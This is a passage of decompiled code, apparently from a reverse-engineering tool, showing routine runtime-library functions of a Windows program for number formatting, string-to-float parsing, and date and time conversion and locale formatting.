      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
  }
  else {
    uVar2 = (uint)param_6;
    if ((param_6 != 1) && ((4 < param_6 || (iVar1 < (short)local_30[0])))) {
      uVar2 = 0;
    }
    (*(code *)(*(int *)((int)&PTR_LAB_004081ac + local_18 + uVar2 * 4) + local_18))();
  }
  FUN_0040839d();
  return;
}



char FUN_004081c6(void)

{
  char cVar1;
  char *unaff_ESI;
  
  cVar1 = *unaff_ESI;
  if (cVar1 == '\0') {
    cVar1 = '0';
  }
  return cVar1;
}



void FUN_004081cf(void)

{
  int unaff_EBP;
  undefined *unaff_EDI;
  
  if (*(char *)(unaff_EBP + -0x2a) != '\0') {
    *unaff_EDI = 0x2d;
  }
  return;
}



void FUN_00408271(void)

{
  char cVar1;
  int iVar2;
  int extraout_ECX;
  uint uVar3;
  uint extraout_EDX;
  int extraout_EDX_00;
  int iVar4;
  int unaff_EBP;
  char *unaff_EDI;
  char *pcVar5;
  char *pcVar6;
  byte bVar7;
  
  bVar7 = 0;
  uVar3 = *(uint *)(unaff_EBP + 8);
  if (0x11 < uVar3) {
    uVar3 = 0x12;
  }
  iVar2 = (int)*(short *)(unaff_EBP + -0x2c);
  if (iVar2 < 1) {
    pcVar5 = unaff_EDI + 1;
    *unaff_EDI = '0';
  }
  else {
    iVar4 = 0;
    if (*(char *)(unaff_EBP + 0x10) != '\x02') {
      iVar4 = (byte)((ushort)(*(short *)(unaff_EBP + -0x2c) - 1U) % 3) + 1;
    }
    while( true ) {
      cVar1 = FUN_004081c6();
      pcVar5 = unaff_EDI + (uint)bVar7 * -2 + 1;
      *unaff_EDI = cVar1;
      iVar2 = extraout_ECX + -1;
      uVar3 = extraout_EDX;
      if (iVar2 == 0) break;
      iVar4 = iVar4 + -1;
      unaff_EDI = pcVar5;
      if ((iVar4 == 0) && (*(char *)(unaff_EBP + -6) != '\0')) {
        unaff_EDI = pcVar5 + (uint)bVar7 * -2 + 1;
        *pcVar5 = *(char *)(unaff_EBP + -6);
        iVar4 = 3;
      }
    }
  }
  if (uVar3 != 0) {
    pcVar6 = pcVar5;
    if (*(char *)(unaff_EBP + -5) != '\0') {
      pcVar6 = pcVar5 + (uint)bVar7 * -2 + 1;
      *pcVar5 = *(char *)(unaff_EBP + -5);
    }
    for (; iVar2 != 0; iVar2 = iVar2 + 1) {
      *pcVar6 = '0';
      uVar3 = uVar3 - 1;
      if (uVar3 == 0) {
        return;
      }
      pcVar6 = pcVar6 + (uint)bVar7 * -2 + 1;
    }
    do {
      cVar1 = FUN_004081c6();
      *pcVar6 = cVar1;
      pcVar6 = pcVar6 + (uint)bVar7 * -2 + 1;
    } while (extraout_EDX_00 != 1);
  }
  return;
}



void FUN_0040832a(void)

{
  int iVar1;
  int unaff_EBP;
  undefined *puVar2;
  undefined *unaff_EDI;
  
  puVar2 = *(undefined **)(unaff_EBP + -0xc);
  if (puVar2 != (undefined *)0x0) {
    iVar1 = *(int *)(puVar2 + -4);
    for (; iVar1 != 0; iVar1 = iVar1 + -1) {
      *unaff_EDI = *puVar2;
      puVar2 = puVar2 + 1;
      unaff_EDI = unaff_EDI + 1;
    }
  }
  return;
}



void FUN_0040839d(void)

{
  return;
}



void FUN_004083a4(undefined4 param_1,undefined4 param_2,char param_3)

{
  if (param_3 != '\0') {
    FUN_004084f3();
    FUN_004085c7();
    return;
  }
  FUN_004083d1();
  FUN_004085c7();
  return;
}



void FUN_004083d1(void)

{
  char *pcVar1;
  float10 fVar2;
  unkbyte10 Var3;
  byte bVar4;
  undefined2 uVar5;
  uint uVar6;
  ushort uVar7;
  int iVar8;
  undefined2 *unaff_EBX;
  int unaff_EBP;
  float10 *unaff_ESI;
  short *psVar9;
  short *psVar10;
  byte bVar11;
  float10 fVar12;
  
  bVar11 = 0;
  uVar7 = *(ushort *)((int)unaff_ESI + 8);
  uVar6 = uVar7 & 0x7fff;
  if ((uVar7 & 0x7fff) == 0) {
LAB_004083fc:
    uVar7 = 0;
  }
  else {
    if (uVar6 != 0x7fff) {
      fVar12 = *unaff_ESI;
      *(int *)(unaff_EBP + -8) = ((int)((uVar6 - 0x3fff) * 0x4d10) >> 0x10) + 1;
      fVar12 = ABS(fVar12);
      thunk_FUN_0040312c();
      fVar12 = ROUND(fVar12);
      fVar2 = *(float10 *)(&DAT_00418168 + *(int *)(unaff_EBP + -4));
      *(ushort *)(unaff_EBP + -10) =
           (ushort)(fVar2 < fVar12) << 8 | (ushort)(NAN(fVar2) || NAN(fVar12)) << 10 |
           (ushort)(fVar2 == fVar12) << 0xe;
      if ((*(ushort *)(unaff_EBP + -10) & 0x4100) != 0) {
        fVar12 = fVar12 / (float10)*(int *)((int)&DAT_00418174 + *(int *)(unaff_EBP + -4));
        *(int *)(unaff_EBP + -8) = *(int *)(unaff_EBP + -8) + 1;
      }
      Var3 = to_bcd(fVar12);
      *(unkbyte10 *)(unaff_EBP + -0x18) = Var3;
      iVar8 = 9;
      psVar9 = (short *)((int)unaff_EBX + 3);
      do {
        bVar4 = *(byte *)(iVar8 + -0x19 + unaff_EBP);
        psVar10 = psVar9 + (uint)bVar11 * -2 + 1;
        *psVar9 = (CONCAT11(bVar4,bVar4 >> 4) & 0xfff) + 0x3030;
        iVar8 = iVar8 + -1;
        psVar9 = psVar10;
      } while (iVar8 != 0);
      *(undefined *)psVar10 = 0;
      uVar6 = *(int *)(unaff_EBP + -8) + *(int *)(unaff_EBP + 8);
      if ((int)uVar6 < 0) {
        uVar6 = 0;
        goto LAB_004083fc;
      }
      if (*(uint *)(unaff_EBP + 0xc) <= uVar6) {
        uVar6 = *(uint *)(unaff_EBP + 0xc);
      }
      if (uVar6 < 0x12) {
        if (*(byte *)((int)unaff_EBX + uVar6 + 3) < 0x35) goto LAB_004084be;
        do {
          *(undefined *)((int)unaff_EBX + uVar6 + 3) = 0;
          if ((int)(uVar6 - 1) < 0) {
            *(undefined2 *)((int)unaff_EBX + 3) = 0x31;
            *(int *)(unaff_EBP + -8) = *(int *)(unaff_EBP + -8) + 1;
            break;
          }
          pcVar1 = (char *)((int)unaff_EBX + uVar6 + 2);
          *pcVar1 = *pcVar1 + '\x01';
          iVar8 = uVar6 + 2;
          uVar6 = uVar6 - 1;
        } while (0x39 < *(byte *)((int)unaff_EBX + iVar8));
      }
      else {
        uVar6 = 0x12;
LAB_004084be:
        do {
          *(undefined *)((int)unaff_EBX + uVar6 + 3) = 0;
          if ((int)(uVar6 - 1) < 0) {
            bVar11 = 0;
            goto LAB_004084d1;
          }
          iVar8 = uVar6 + 2;
          uVar6 = uVar6 - 1;
        } while (*(char *)((int)unaff_EBX + iVar8) == '0');
      }
      bVar11 = (byte)((ushort)*(undefined2 *)((int)unaff_ESI + 8) >> 8);
LAB_004084d1:
      uVar5 = (undefined2)*(undefined4 *)(unaff_EBP + -8);
      goto LAB_004084d4;
    }
    if (((*(ushort *)((int)unaff_ESI + 6) & 0x8000) != 0) &&
       ((*(int *)unaff_ESI != 0 || (*(int *)((int)unaff_ESI + 4) != -0x80000000)))) {
      uVar6 = 0x8000;
      goto LAB_004083fc;
    }
  }
  bVar11 = (byte)(uVar7 >> 8);
  uVar5 = (undefined2)uVar6;
  *(undefined *)((int)unaff_EBX + 3) = 0;
LAB_004084d4:
  *unaff_EBX = uVar5;
  *(byte *)(unaff_EBX + 1) = bVar11 >> 7;
  return;
}



void FUN_004084f3(void)

{
  unkbyte10 Var1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  byte bVar5;
  short sVar6;
  uint uVar7;
  int iVar8;
  byte bVar9;
  uint uVar10;
  short *unaff_EBX;
  int unaff_EBP;
  uint *unaff_ESI;
  int iVar11;
  short *psVar12;
  short *psVar13;
  bool bVar14;
  float10 fVar15;
  
  uVar7 = *unaff_ESI;
  uVar10 = unaff_ESI[1];
  if ((uVar7 | uVar10) != 0) {
    if ((int)uVar10 < 0) {
      bVar14 = uVar7 != 0;
      uVar7 = -uVar7;
      uVar10 = -(uint)bVar14 - uVar10;
    }
    iVar8 = 0;
    iVar11 = *(int *)(unaff_EBP + 8);
    if (iVar11 < 0) {
      iVar11 = 0;
    }
    if (3 < iVar11) {
      iVar11 = 4;
      uVar3 = uVar7;
      iVar4 = iVar8;
      do {
        iVar8 = iVar4;
        uVar7 = uVar3;
        bVar14 = 0xde0b6b2 < uVar10;
        uVar2 = uVar10 + 0xf21f494d;
        uVar10 = uVar2 - (uVar7 < 0xa7640000);
        uVar3 = uVar7 + 0x589c0000;
        iVar4 = iVar8 + 1;
      } while (bVar14 && (uVar7 < 0xa7640000) <= uVar2);
      uVar10 = uVar10 + 0xde0b6b3 + (uint)(0x589bffff < uVar7 + 0x589c0000);
    }
    *(uint *)(unaff_EBP + -0x20) = uVar7;
    *(uint *)(unaff_EBP + -0x1c) = uVar10;
    fVar15 = (float10)*(longlong *)(unaff_EBP + -0x20);
    if (4 - iVar11 != 0) {
      fVar15 = fVar15 / (float10)*(int *)(*(int *)(unaff_EBP + -4) + 0x4084df + (4 - iVar11) * 4);
    }
    Var1 = to_bcd(fVar15);
    *(unkbyte10 *)(unaff_EBP + -0x18) = Var1;
    psVar12 = (short *)((int)unaff_EBX + 3);
    if (iVar8 != 0) {
      psVar13 = unaff_EBX + 2;
      *(char *)psVar12 = (char)iVar8 + '0';
      iVar8 = 9;
      goto LAB_0040858a;
    }
    iVar8 = 9;
    do {
      bVar9 = *(byte *)(iVar8 + -0x19 + unaff_EBP);
      bVar5 = bVar9 >> 4;
      psVar13 = psVar12;
      if (bVar5 != 0) goto LAB_00408593;
      if ((bVar9 & 0xf) != 0) goto LAB_0040859a;
      iVar8 = iVar8 + -1;
    } while (iVar8 != 0);
  }
  sVar6 = 0;
  bVar9 = 0;
  *(undefined *)((int)unaff_EBX + 3) = 0;
LAB_004085c0:
  *unaff_EBX = sVar6;
  *(byte *)(unaff_EBX + 1) = bVar9;
  return;
LAB_0040859a:
  while( true ) {
    psVar13 = (short *)((int)psVar12 + 1);
    *(byte *)psVar12 = (bVar9 & 0xf) + 0x30;
    iVar8 = iVar8 + -1;
    if (iVar8 == 0) break;
LAB_0040858a:
    bVar9 = *(byte *)(iVar8 + -0x19 + unaff_EBP);
    bVar5 = bVar9 >> 4;
LAB_00408593:
    psVar12 = (short *)((int)psVar13 + 1);
    *(byte *)psVar13 = bVar5 + 0x30;
  }
  sVar6 = (short)psVar13 - ((short)unaff_EBX + 3 + (short)iVar11);
  do {
    *(char *)psVar13 = '\0';
    psVar13 = (short *)((int)psVar13 + -1);
  } while (*(char *)psVar13 == '0');
  bVar9 = (byte)(unaff_ESI[1] >> 0x1f);
  goto LAB_004085c0;
}



void FUN_004085c7(void)

{
  return;
}



void FUN_004085d0(byte *param_1,float10 *param_2,char param_3)

{
  byte bVar1;
  byte bVar2;
  byte *extraout_ECX;
  byte *extraout_ECX_00;
  byte *pbVar3;
  float10 fVar4;
  
  bVar2 = DAT_0041967f;
  fVar4 = (float10)0;
  FUN_00408687();
  bVar1 = *param_1;
  if ((bVar1 == 0x2b) || (bVar1 == 0x2d)) {
    param_1 = param_1 + 1;
  }
  FUN_00408692();
  pbVar3 = extraout_ECX;
  if (*param_1 == bVar2) {
    param_1 = param_1 + 1;
    FUN_00408692();
    pbVar3 = extraout_ECX_00;
  }
  if (pbVar3 != param_1) {
    if ((*param_1 & 0xdf) == 0x45) {
      param_1 = param_1 + 1;
      FUN_004086ae();
    }
    FUN_00408687();
    if (*param_1 == 0) {
      thunk_FUN_0040312c();
      if (bVar1 == 0x2d) {
        fVar4 = -fVar4;
      }
      if (param_3 == '\0') {
        *param_2 = fVar4;
      }
      else {
        *(longlong *)param_2 = (longlong)ROUND(fVar4);
      }
    }
  }
  FUN_004086dd();
  return;
}



void FUN_00408687(void)

{
  char cVar1;
  char *unaff_ESI;
  
  do {
    cVar1 = *unaff_ESI;
    if (cVar1 == '\0') {
      return;
    }
    unaff_ESI = unaff_ESI + 1;
  } while (cVar1 == ' ');
  return;
}



void FUN_00408692(void)

{
  int unaff_EBP;
  char *unaff_ESI;
  
  while( true ) {
    if ((byte)(*unaff_ESI - 0x3aU) < 0xf6) break;
    *(uint *)(unaff_EBP + -0xc) = (uint)(byte)(*unaff_ESI - 0x30);
    unaff_ESI = unaff_ESI + 1;
  }
  return;
}



void FUN_004086ae(void)

{
  char cVar1;
  uint uVar2;
  char *unaff_ESI;
  
  uVar2 = 0;
  if ((*unaff_ESI == '+') || (*unaff_ESI == '-')) {
    unaff_ESI = unaff_ESI + 1;
  }
  do {
    cVar1 = *unaff_ESI;
    if ((byte)(cVar1 - 0x3aU) < 0xf6) {
      return;
    }
    unaff_ESI = unaff_ESI + 1;
    uVar2 = uVar2 * 10 + (uint)(byte)(cVar1 - 0x30);
  } while (uVar2 < 500);
  return;
}



void FUN_004086dd(void)

{
  return;
}



void FUN_004086e4(int *param_1,undefined param_2,undefined param_3,undefined param_4)

{
  uint uVar1;
  undefined4 local_44 [16];
  
  uVar1 = FUN_004080d0((undefined *)local_44,&param_4,'\0',0,0xf,0);
  FUN_0040414c(param_1,local_44,uVar1);
  return;
}



void FUN_00408714(int *param_1,undefined param_2,undefined param_3,undefined param_4)

{
  uint uVar1;
  undefined4 local_44 [16];
  
  uVar1 = FUN_004080d0((undefined *)local_44,&param_4,'\x01',0,0,0);
  FUN_0040414c(param_1,local_44,uVar1);
  return;
}



void FUN_00408744(undefined *param_1,float10 *param_2)

{
  byte *pbVar1;
  
  pbVar1 = FUN_004044f8(param_1);
  FUN_004085d0(pbVar1,param_2,'\0');
  return;
}



void FUN_00408760(undefined *param_1,double *param_2)

{
  char cVar1;
  byte *pbVar2;
  float10 fStack_14;
  
  pbVar2 = FUN_004044f8(param_1);
  cVar1 = FUN_004085d0(pbVar2,&fStack_14,'\0');
  if (cVar1 != '\0') {
    *param_2 = (double)fStack_14;
  }
  return;
}



void FUN_0040878c(undefined *param_1,float *param_2)

{
  char cVar1;
  byte *pbVar2;
  float10 fStack_14;
  
  pbVar2 = FUN_004044f8(param_1);
  cVar1 = FUN_004085d0(pbVar2,&fStack_14,'\0');
  if (cVar1 != '\0') {
    *param_2 = (float)fStack_14;
  }
  return;
}



void FUN_004087b8(undefined *param_1,float10 *param_2)

{
  byte *pbVar1;
  
  pbVar1 = FUN_004044f8(param_1);
  FUN_004085d0(pbVar1,param_2,'\x01');
  return;
}



void FUN_004087d4(undefined4 *param_1,undefined4 param_2,undefined4 param_3,double param_4)

{
  ulonglong uVar1;
  int iVar2;
  undefined4 uVar3;
  int local_10;
  int iStack_c;
  
  uVar1 = (ulonglong)ROUND(param_4 * (double)DAT_0041817c);
  local_10 = (int)uVar1;
  iStack_c = (int)(uVar1 >> 0x20);
  if ((longlong)uVar1 < 0) {
    uVar1 = CONCAT44(-(uint)(local_10 != 0) - iStack_c,-local_10);
    uVar3 = (undefined4)(uVar1 % (ulonglong)DAT_00418180);
    iVar2 = -(int)(uVar1 / DAT_00418180);
  }
  else {
    iVar2 = (int)(uVar1 / DAT_00418180);
    uVar3 = (undefined4)(uVar1 % (ulonglong)DAT_00418180);
  }
  *param_1 = uVar3;
  param_1[1] = iVar2 + 0xa955a;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined FUN_00408818(ushort param_1,ushort param_2,ushort param_3,double *param_4,ushort param_5)

{
  undefined local_5;
  
  local_5 = 0;
  if ((((param_1 < 0x18) && (param_2 < 0x3c)) && (param_3 < 0x3c)) && (param_5 < 1000)) {
    *param_4 = (double)((float)((uint)param_1 * 3600000 + (uint)param_2 * 60000 +
                                (uint)param_3 * 1000 + (uint)param_5) / _DAT_00408884);
    local_5 = 1;
  }
  return local_5;
}



void FUN_00408888(ushort param_1,ushort param_2,ushort param_3,ushort param_4)

{
  char cVar1;
  double local_c;
  
  cVar1 = FUN_00408818(param_1,param_2,param_3,&local_c,param_4);
  if (cVar1 == '\0') {
    FUN_00406fec((int **)PTR_PTR_DAT_004185c8);
  }
  return;
}



void FUN_004088c8(undefined2 *param_1,undefined2 *param_2,undefined2 *param_3,undefined2 *param_4,
                 undefined4 param_5,undefined4 param_6)

{
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  undefined2 extraout_var_01;
  ushort *puVar1;
  uint local_10 [2];
  ushort local_8;
  ushort local_6;
  
  puVar1 = &local_8;
  FUN_004087d4(local_10,param_2,param_3,(double)CONCAT44(param_6,param_5));
  FUN_00406fd0(local_10[0],CONCAT22(extraout_var,60000),&local_6,puVar1);
  FUN_00406fd0((uint)local_6,CONCAT22(extraout_var_00,0x3c),param_1,param_2);
  FUN_00406fd0((uint)local_8,CONCAT22(extraout_var_01,1000),param_3,param_4);
  return;
}



undefined4 FUN_00408924(uint param_1)

{
  uint uVar1;
  uint uVar2;
  
  if ((param_1 & 3) == 0) {
    uVar2 = param_1 & 0xffff;
    uVar1 = 100;
    if ((uVar2 % 100 != 0) || (uVar1 = 400, uVar2 % 400 == 0)) {
      return CONCAT31((int3)(uVar2 / uVar1 >> 8),1);
    }
  }
  return 0;
}



undefined FUN_00408960(uint param_1,ushort param_2,ushort param_3,double *param_4)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  undefined local_7;
  
  local_7 = 0;
  uVar1 = FUN_00408924(param_1);
  iVar4 = (uVar1 & 0x7f) * 0x18;
  if (((((ushort)param_1 != 0) && ((ushort)param_1 < 10000)) && (param_2 != 0)) &&
     (((param_2 < 0xd && (param_3 != 0)) &&
      (param_3 <= *(ushort *)(iVar4 + 0x4180de + (uint)param_2 * 2))))) {
    iVar2 = param_2 - 1;
    if (0 < iVar2) {
      iVar3 = 1;
      do {
        param_3 = param_3 + *(short *)(iVar4 + 0x4180de + iVar3 * 2);
        iVar3 = iVar3 + 1;
        iVar2 = iVar2 + -1;
      } while (iVar2 != 0);
    }
    iVar2 = (param_1 & 0xffff) - 1;
    iVar4 = iVar2;
    if (iVar2 < 0) {
      iVar4 = (param_1 & 0xffff) + 2;
    }
    *param_4 = (double)(((iVar2 * 0x16d + (iVar4 >> 2)) - iVar2 / 100) + iVar2 / 400 + (uint)param_3
                       + -0xa955a);
    local_7 = 1;
  }
  return local_7;
}



void FUN_00408a28(uint param_1,ushort param_2,ushort param_3)

{
  char cVar1;
  double local_14;
  
  cVar1 = FUN_00408960(param_1,param_2,param_3,&local_14);
  if (cVar1 == '\0') {
    FUN_00406fec((int **)PTR_PTR_DAT_00418650);
  }
  return;
}



uint FUN_00408a58(short *param_1,ushort *param_2,short *param_3,undefined2 *param_4,
                 undefined4 param_5,undefined4 param_6)

{
  ushort uVar1;
  short sVar2;
  short sVar3;
  ushort uVar4;
  uint uVar5;
  int iVar6;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  short sVar7;
  undefined4 local_1c;
  int local_18;
  short local_14;
  ushort local_12;
  short *local_10;
  ushort *local_c;
  short *local_8;
  
  local_10 = param_3;
  local_c = param_2;
  local_8 = param_1;
  FUN_004087d4(&local_1c,param_2,param_3,(double)CONCAT44(param_6,param_5));
  if (local_18 < 1) {
    *local_8 = 0;
    *local_c = 0;
    *local_10 = 0;
    *param_4 = 0;
    uVar5 = 0;
  }
  else {
    iVar6 = local_18 % 7 + 1;
    *param_4 = (short)iVar6;
    sVar7 = 1;
    for (uVar5 = local_18 - 1; 0x23ab0 < (int)uVar5; uVar5 = uVar5 - 0x23ab1) {
      sVar7 = sVar7 + 400;
    }
    FUN_00406fd0(uVar5,CONCAT22((short)((uint)iVar6 >> 0x10),0x8eac),&local_14,&local_12);
    if (local_14 == 4) {
      local_14 = 3;
      local_12 = local_12 + 0x8eac;
    }
    sVar2 = local_14 * 100;
    FUN_00406fd0((uint)local_12,CONCAT22(extraout_var,0x5b5),&local_14,&local_12);
    sVar3 = local_14 * 4;
    FUN_00406fd0((uint)local_12,CONCAT22(extraout_var_00,0x16d),&local_14,&local_12);
    if (local_14 == 4) {
      local_14 = 3;
      local_12 = local_12 + 0x16d;
    }
    sVar7 = sVar7 + sVar2 + sVar3 + local_14;
    uVar5 = FUN_00408924(CONCAT22((short)((uint)param_4 >> 0x10),sVar7));
    uVar4 = 1;
    for (; uVar1 = *(ushort *)((uVar5 & 0xff) * 0x18 + 0x4180de + (uint)uVar4 * 2),
        uVar1 <= local_12; local_12 = local_12 - uVar1) {
      uVar4 = uVar4 + 1;
    }
    *local_8 = sVar7;
    *local_c = uVar4;
    *local_10 = local_12 + 1;
  }
  return uVar5;
}



void FUN_00408ba4(short *param_1,ushort *param_2,short *param_3,undefined4 param_4,
                 undefined4 param_5)

{
  undefined4 uStack_8;
  
  uStack_8 = param_3;
  FUN_00408a58(param_1,param_2,param_3,(undefined2 *)((int)&uStack_8 + 2),param_4,param_5);
  return;
}



int FUN_00408bc4(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                undefined4 param_5)

{
  undefined4 local_c;
  int local_8;
  
  FUN_004087d4(&local_c,param_2,param_3,(double)CONCAT44(param_5,param_4));
  return local_8 % 7 + 1;
}



void FUN_00408bec(void)

{
  LPSYSTEMTIME lpSystemTime;
  float10 in_ST0;
  _SYSTEMTIME local_18;
  double local_8;
  
  lpSystemTime = &local_18;
  GetLocalTime(lpSystemTime);
  FUN_00408a28(CONCAT22((short)((uint)lpSystemTime >> 0x10),local_18.wYear),local_18.wMonth,
               local_18.wDay);
  local_8 = (double)in_ST0;
  FUN_00408888(local_18.wHour,local_18.wMinute,local_18.wSecond,local_18.wMilliseconds);
  return;
}



WORD FUN_00408c3c(void)

{
  _SYSTEMTIME local_10;
  
  GetLocalTime(&local_10);
  return local_10.wYear;
}



void FUN_00408c50(undefined4 *param_1,uint param_2,undefined4 param_3,int param_4)

{
  uint uVar1;
  
  uVar1 = 0x100 - *(int *)(param_4 + -0x104);
  if ((int)param_2 < (int)uVar1) {
    uVar1 = param_2;
  }
  if (uVar1 != 0) {
    FUN_00402890(param_1,(undefined4 *)(param_4 + -0x100 + *(int *)(param_4 + -0x104)),uVar1);
  }
  *(int *)(param_4 + -0x104) = *(int *)(param_4 + -0x104) + uVar1;
  return;
}



void FUN_00408c94(undefined4 *param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  uint uVar1;
  undefined4 extraout_ECX;
  
  uVar1 = FUN_004042f8((int)param_1);
  FUN_00408c50(param_1,uVar1,extraout_ECX,param_4);
  return;
}



void FUN_00408cb4(undefined4 param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  uint uVar1;
  undefined4 extraout_ECX;
  undefined4 local_24;
  undefined local_20;
  undefined4 local_1c;
  undefined local_18;
  undefined4 local_14 [4];
  
  local_20 = 0;
  local_18 = 0;
  local_24 = param_2;
  local_1c = param_1;
  uVar1 = FUN_00407c00((byte *)local_14,(byte *)0x10,&DAT_00418184,1,&local_24,4);
  FUN_00408c50(local_14,uVar1,extraout_ECX,param_4);
  return;
}



void FUN_00408d00(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  char *pcVar1;
  char **ppcVar2;
  
  ppcVar2 = (char **)(param_4 + -4);
  pcVar1 = *ppcVar2;
  while (**ppcVar2 == *(char *)(param_4 + -5)) {
    *ppcVar2 = *ppcVar2 + 1;
  }
  *(char **)(param_4 + -0xc) = *ppcVar2 + (1 - (int)pcVar1);
  return;
}



void FUN_00408d2c(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  if (*(char *)(param_4 + -0x13) == '\0') {
    FUN_00408ba4((short *)(param_4 + -0xe),(ushort *)(param_4 + -0x10),(short *)(param_4 + -0x12),
                 *(undefined4 *)(*(int *)(param_4 + 8) + 8),
                 *(undefined4 *)(*(int *)(param_4 + 8) + 0xc));
    *(undefined *)(param_4 + -0x13) = 1;
  }
  return;
}



void FUN_00408d64(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  if (*(char *)(param_4 + -0x1d) == '\0') {
    FUN_004088c8((undefined2 *)(param_4 + -0x16),(undefined2 *)(param_4 + -0x18),
                 (undefined2 *)(param_4 + -0x1a),(undefined2 *)(param_4 + -0x1c),
                 *(undefined4 *)(*(int *)(param_4 + 8) + 8),
                 *(undefined4 *)(*(int *)(param_4 + 8) + 0xc));
    *(undefined *)(param_4 + -0x1d) = 1;
  }
  return;
}



void FUN_00408da4(int param_1,int *param_2,undefined4 param_3,int param_4)

{
  LPCSTR lpFormat;
  LCID Locale;
  uint uVar1;
  undefined4 *in_FS_OFFSET;
  DWORD dwFlags;
  SYSTEMTIME *lpDate;
  undefined4 *puVar2;
  int iVar3;
  int *piVar4;
  undefined4 uStack_130;
  undefined *puStack_12c;
  undefined *puStack_128;
  undefined local_11c [4];
  undefined4 local_118 [64];
  SYSTEMTIME local_18;
  undefined *local_8;
  
  puStack_128 = &stack0xfffffffc;
  local_11c = (undefined  [4])0x0;
  local_8 = (undefined *)0x0;
  puStack_12c = &LAB_00408ef2;
  uStack_130 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_130;
  FUN_0040405c(param_2);
  local_18.wYear = *(WORD *)(param_4 + -0xe);
  local_18.wMonth = *(WORD *)(param_4 + -0x10);
  local_18.wDay = *(WORD *)(param_4 + -0x12);
  FUN_004040f4((int *)&local_8,0x408f08);
  iVar3 = 0x100;
  puVar2 = local_118;
  lpFormat = FUN_004044f8(local_8);
  lpDate = &local_18;
  dwFlags = 4;
  Locale = GetThreadLocale();
  iVar3 = GetDateFormatA(Locale,dwFlags,lpDate,lpFormat,(LPSTR)puVar2,iVar3);
  if (iVar3 != 0) {
    FUN_004042cc(param_2,local_118,0x100);
    if (param_1 == 1) {
      if (DAT_0041973c == 4) {
        if (DAT_00419740 == 1) {
          iVar3 = FUN_004042f8(*param_2);
          iVar3 = FUN_0040b1dc((undefined *)*param_2,iVar3);
          if (iVar3 == 4) {
            iVar3 = FUN_0040b2ec((undefined *)*param_2,3);
            puVar2 = (undefined4 *)((int)local_118 + iVar3 + -1);
            FUN_00404254((int *)local_11c,puVar2);
            uVar1 = FUN_0040b350((undefined *)local_11c,2);
            FUN_0040414c(param_2,puVar2,uVar1);
          }
        }
      }
      else if (DAT_0041973c == 0x11) {
        piVar4 = param_2;
        uVar1 = FUN_0040b350((undefined *)*param_2,1);
        FUN_00404558(*param_2,1,uVar1,piVar4);
      }
    }
  }
  *in_FS_OFFSET = uStack_130;
  puStack_128 = &LAB_00408ef9;
  puStack_12c = (undefined *)0x408ee9;
  FUN_0040405c((int *)local_11c);
  puStack_12c = (undefined *)0x408ef1;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_00408f0c(int param_1,char **param_2,undefined4 param_3,int param_4)

{
  LPCSTR lpFormat;
  LCID Locale;
  undefined4 *in_FS_OFFSET;
  DWORD dwFlags;
  SYSTEMTIME *lpDate;
  undefined4 *lpDateStr;
  int iVar1;
  char **ppcVar2;
  undefined4 uStack_12c;
  undefined *puStack_128;
  undefined *puStack_124;
  undefined4 local_118 [64];
  SYSTEMTIME local_18;
  undefined *local_8;
  
  puStack_124 = &stack0xfffffffc;
  local_8 = (undefined *)0x0;
  puStack_128 = &LAB_00408fea;
  uStack_12c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_12c;
  FUN_0040405c((int *)param_2);
  local_18.wYear = *(WORD *)(param_4 + -0xe);
  local_18.wMonth = *(WORD *)(param_4 + -0x10);
  local_18.wDay = *(WORD *)(param_4 + -0x12);
  if (param_1 < 3) {
    FUN_004040f4((int *)&local_8,0x409000);
  }
  else {
    FUN_004040f4((int *)&local_8,0x40900c);
  }
  iVar1 = 0x100;
  lpDateStr = local_118;
  lpFormat = FUN_004044f8(local_8);
  lpDate = &local_18;
  dwFlags = 4;
  Locale = GetThreadLocale();
  iVar1 = GetDateFormatA(Locale,dwFlags,lpDate,lpFormat,(LPSTR)lpDateStr,iVar1);
  if (iVar1 != 0) {
    FUN_004042cc((int *)param_2,local_118,0x100);
    if ((param_1 == 1) && (**param_2 == '0')) {
      ppcVar2 = param_2;
      iVar1 = FUN_004042f8((int)*param_2);
      FUN_00404558((int)*param_2,2,iVar1 - 1,(int *)ppcVar2);
    }
  }
  *in_FS_OFFSET = uStack_12c;
  puStack_124 = &LAB_00408ff1;
  puStack_128 = (undefined *)0x408fe9;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_00409014(undefined4 *param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  byte bVar1;
  undefined uVar2;
  ushort uVar3;
  uint uVar4;
  undefined4 *puVar5;
  int iVar6;
  undefined uVar7;
  undefined extraout_CL;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined *extraout_ECX_03;
  undefined *extraout_ECX_04;
  undefined *extraout_ECX_05;
  undefined *extraout_ECX_06;
  undefined *puVar8;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  undefined4 extraout_ECX_09;
  undefined4 extraout_ECX_10;
  undefined4 extraout_ECX_11;
  undefined4 extraout_ECX_12;
  undefined4 extraout_ECX_13;
  undefined4 uVar9;
  char cVar10;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined extraout_DL_06;
  undefined extraout_DL_07;
  undefined extraout_DL_08;
  undefined extraout_DL_09;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined4 extraout_EDX_06;
  undefined4 extraout_EDX_07;
  undefined4 extraout_EDX_08;
  undefined4 extraout_EDX_09;
  undefined4 extraout_EDX_10;
